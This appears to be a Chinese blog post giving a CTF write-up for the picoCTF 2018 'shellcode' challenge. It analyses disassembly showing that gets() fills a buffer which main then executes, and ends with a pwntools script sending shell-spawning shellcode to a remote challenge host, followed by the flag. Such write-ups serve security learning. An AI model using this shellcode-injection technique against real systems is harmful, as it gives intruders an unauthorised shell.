---
layout: post
title:  shellcode
date:   2021-06-24 00:01:01 +0300
image:  2021-06-24-clock.jpg
tags:   [ctf,Pwn,shellcode,picoctf2018]
---

main，不能反汇编，只能看汇编代码分析。

```assembly
.text:080488A1 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:080488A1                 public main
.text:080488A1 main            proc near               ; DATA XREF: _start+17↑o
.text:080488A1
.text:080488A1 var_A0          = byte ptr -0A0h
.text:080488A1 var_C           = dword ptr -0Ch
.text:080488A1 var_4           = dword ptr -4
.text:080488A1 argc            = dword ptr  8
.text:080488A1 argv            = dword ptr  0Ch
.text:080488A1 envp            = dword ptr  10h
.text:080488A1
.text:080488A1 ; __unwind {
.text:080488A1                 lea     ecx, [esp+4]
.text:080488A5                 and     esp, 0FFFFFFF0h
.text:080488A8                 push    dword ptr [ecx-4]
.text:080488AB                 push    ebp
.text:080488AC                 mov     ebp, esp
.text:080488AE                 push    ecx
.text:080488AF                 sub     esp, 0A4h
.text:080488B5                 mov     eax, stdout
.text:080488BA                 push    0
.text:080488BC                 push    2
.text:080488BE                 push    0
.text:080488C0                 push    eax
.text:080488C1                 call    setvbuf
.text:080488C6                 add     esp, 10h
.text:080488C9                 call    getegid
.text:080488CE                 mov     [ebp+var_C], eax
.text:080488D1                 sub     esp, 4
.text:080488D4                 push    [ebp+var_C]
.text:080488D7                 push    [ebp+var_C]
.text:080488DA                 push    [ebp+var_C]
.text:080488DD                 call    setresgid
.text:080488E2                 add     esp, 10h
.text:080488E5                 sub     esp, 0Ch
.text:080488E8                 push    offset aEnterAString ; "Enter a string!"
.text:080488ED                 call    puts
.text:080488F2                 add     esp, 10h
.text:080488F5                 sub     esp, 0Ch
.text:080488F8                 lea     eax, [ebp+var_A0]
.text:080488FE                 push    eax
.text:080488FF                 call    vuln
.text:08048904                 add     esp, 10h
.text:08048907                 sub     esp, 0Ch
.text:0804890A                 push    offset aThanksExecutin ; "Thanks! Executing now..."
.text:0804890F                 call    puts
.text:08048914                 add     esp, 10h
.text:08048917                 lea     eax, [ebp+var_A0]
.text:0804891D                 call    eax
.text:0804891F                 mov     eax, 0
.text:08048924                 mov     ecx, [ebp+var_4]
.text:08048927                 leave
.text:08048928                 lea     esp, [ecx-4]
.text:0804892B                 retn
.text:0804892B ; } // starts at 80488A1
.text:0804892B main            endp
```

可以看到

```assembly
call eax
```

这处比较可疑，说明了eax在之前被赋予了某部分的地址。

vuln

```assembly
int __cdecl vuln(int a1)
{
  gets((_BYTE *)a1);
  return puts(a1);
}
```

对应的汇编

```assembly
.text:0804887C                 public vuln
.text:0804887C vuln            proc near               ; CODE XREF: main+5E↓p
.text:0804887C
.text:0804887C arg_0           = dword ptr  8
.text:0804887C
.text:0804887C ; __unwind {
.text:0804887C                 push    ebp
.text:0804887D                 mov     ebp, esp
.text:0804887F                 sub     esp, 8
.text:08048882                 sub     esp, 0Ch
.text:08048885                 push    [ebp+arg_0]
.text:08048888                 call    gets
.text:0804888D                 add     esp, 10h
.text:08048890                 sub     esp, 0Ch
.text:08048893                 push    [ebp+arg_0]
.text:08048896                 call    puts
.text:0804889B                 add     esp, 10h
.text:0804889E                 nop
.text:0804889F                 leave
.text:080488A0                 retn
.text:080488A0 ; } // starts at 804887C
.text:080488A0 vuln            endp
```

gets 函数写入的地址即为 [ebp+var_A0] 对应的地址

call的地址即为 [ebp+var_A0] 所指向的地址

```assembly
from pwn import *

io = remote("node4.buuoj.cn", 26765)

shellcode = asm(shellcraft.sh())
io.send(shellcode)

io.interactive()
```

flag{07af0930-8e76-4804-975f-4678c6c70079}